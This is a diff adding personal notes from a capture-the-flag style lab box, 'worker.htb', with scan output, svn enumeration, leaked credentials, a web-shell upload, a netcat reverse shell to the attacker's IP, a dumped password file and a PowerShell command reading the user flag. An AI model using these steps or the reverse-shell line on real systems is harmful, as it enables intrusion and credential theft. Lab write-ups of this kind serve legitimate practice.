@@ -12,4 +12,136 @@ PORT     STATE SERVICE  VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
 Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-16 08:49 EDT
+Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 28.61% done; ETC: 08:51 (0:01:45 remaining)
+Nmap scan report for worker.htb (10.10.10.203)
+Host is up (0.050s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 114.83 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+X - ffuf -u http://worker.htb/FUZZ -w ~/wordlists/raft-large-files.txt:
+  iisstart.htm
+X - ffuf -u http://worker.htb:5985/FUZZ -w ~/wordlists/raft-large-files.txt:
+X - ffuf -u http://worker.htb:5985/FUZZ -w ~/wordlists/raft-large-directories.txt:
+
+X - ffuf -u http://worker.htb/FUZZ -w ~/wordlists/raft-large-directories.txt:
+  aspnet_client
+  aspnet_client/system_web
+  aspnet_client/system_web/4_0_30319
+    ffuf -u http://worker.htb/aspnet_client/system_web/FUZZ -w ~/wordlists/ms_system_web_versions.txt 
+
+O - nc -vv worker.htb 3690
+  worker.htb [10.10.10.203] 3690 (svn) open
+  ( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) ) 
+  svn list svn://worker.htb
+    dimension.worker.htb/
+    moved.txt
+    test/
+  svn co svn://worker.htb *
+    revealed: devops.worker.htb login page, need creds
+    revealed: dimension.worker.htb
+    revealed: alpha.worker.htb
+    revealed: cartoon.worker.htb
+    revealed: lens.worker.htb
+    revealed: solid-state.worker.htb
+    revealed: spectral.worker.htb
+    revealed: story.worker.htb
+    .svn/wc.db username in sqlite3; select * from NODES
+      - nathen 
+  O - svn checkout -r 2 svn://worker.htb
+    $user = "nathen" 
+    $plain = "wendel98"
+    $pwd = ($plain | ConvertTo-SecureString)
+    $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+    $args = "Copy-Site.ps1"
+    Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+
+  svn merge ./
+O - the creds work, but you must turn off BURP proxy
+  now youre on a repo... upload aspx (someone left their reverse shell...)
+  merge into the master of cartoon (alpha, spectral etc) with pull request
+  had to load a webshel... a reverse shell wasnt working
+
+O - upload shell to one of the websites (alpha,cartoon,spectral etc)
+  O - call aspx website
+      - run powershell one liner to get contents of user text:
+        - curl nc.exe
+        - ./nc.exe 10.10.14.3 1339 -e powershell
+  O - get shell, search drivers
+      - Get-PSDrive
+  O - W: drive exists
+      - PS W:\svnrepos\www\conf> cat passwd                                  
+        cat passwd                                                           
+        ### This file is an example password file for svnserve.              
+        ### Its format is similar to that of svnserve.conf. As shown in the  
+        ### example below it contains one section labelled [users].          
+        ### The name and password for each user follow, one account per line.
+                                                                             
+        [users]                                                              
+        nathen = wendel98                                                    
+        nichin = fqerfqerf                                                   
+        nichin = asifhiefh                                                   
+        noahip = player                                                      
+        nuahip = wkjdnw                                                      
+        oakhol = bxwdjhcue                                                   
+        owehol = supersecret                                                 
+        paihol = painfulcode                                                 
+        parhol = gitcommit                                                   
+        pathop = iliketomoveit                                               
+        pauhor = nowayjose                                                   
+        payhos = icanjive                                                    
+        perhou = elvisisalive                                                
+        peyhou = ineedvacation                                               
+        phihou = pokemon                                                     
+        quehub = pickme                                                      
+        quihud = kindasecure                                                 
+        rachul = guesswho                                                    
+        raehun = idontknow                                                   
+        ramhun = thisis                                                      
+        ranhut = getting                                                     
+        rebhyd = rediculous                                                  
+        reeinc = iagree                                                      
+        reeing = tosomepoint                                                 
+        reiing = isthisenough                                                
+        renipr = dummy                                                       
+        rhiire = users                                                       
+        riairv = canyou                                                      
+        ricisa = seewhich                                                    
+        robish = onesare                                                     
+        robisl = wolves11                                                    
+        robive = andwhich                                                    
+        ronkay = onesare                                                     
+        rubkei = the                                                         
+        rupkel = sheeps                                                      
+        ryakel = imtired                                                     
+        sabken = drjones                                                     
+        samken = aqua                                                        
+        sapket = hamburger                                                   
+        sarkil = friday                                                      
+        X - powershell.exe -c "$user='WORKER\robisl'; $pass='wolves11'; try { Invoke-Command -ScriptBlock { Get-Content C:\Users\robisl\Desktop\user.txt } -ComputerName Worker -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo x}" 2>&1
+        O - powershell.exe -c "$user='WORKER\robisl'; $pass='wolves11'; try { Invoke-Command -ScriptBlock { Get-Content C:\Users\robisl\Desktop\user.txt } -ComputerName Worker -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo x}" 2>&1
+            - ^ paste  into plaintext somewhere before using; use with cmd (not ps)
+
+################################################################################
+ROOT
+################################################################################
+
